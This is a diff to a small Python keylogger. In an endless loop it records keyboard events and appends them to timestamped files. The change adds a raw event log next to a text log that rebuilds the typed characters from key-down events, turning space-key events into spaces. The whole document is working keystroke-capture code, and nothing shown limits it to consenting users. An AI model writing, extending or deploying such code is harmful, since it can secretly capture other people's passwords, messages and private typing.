@@ -14,11 +14,15 @@ def calcualteDataAndHour():
     tempTime = datetime.now()
     return str(tempTime.strftime("%Y-%m-%d %H.%M.%S"))
 
-def writeToFile(lPath, lName, l):
+def writeToFileRaw(lPath, lName, l):
     newLog = open(lPath + lName, "a")
     newLog.write(str(l))
     newLog.close()
 
+def writeToFileText(lPath, lName, l):
+    newLog = open(lPath + lName, "a")
+    newLog.write(str(l))
+    newLog.close()
 def main():
 
     tempLogName = calcualteDataAndHour()
@@ -28,8 +32,18 @@ def main():
 
     while True:
         tempLog = recording()
+        strTempLogRaw = str(tempLog)
+        strTempLog = ""
 
-        writeToFile(logsPath,tempLogName+".csv",tempLog + " ")
+        if strTempLogRaw.find("down") != -1:
+            if strTempLogRaw.find("space") != -1:
+                strTempLog = " "
+            else:
+                strTempLog = strTempLogRaw.removeprefix("KeyboardEvent(")
+                strTempLog = strTempLog.removesuffix(" down)")
+        writeToFileRaw(logsPath,tempLogName+".raw",strTempLogRaw + "\n")
+        writeToFileText(logsPath, tempLogName+".txt",strTempLog)
+
 
 #########################
 if __name__== "__main__":
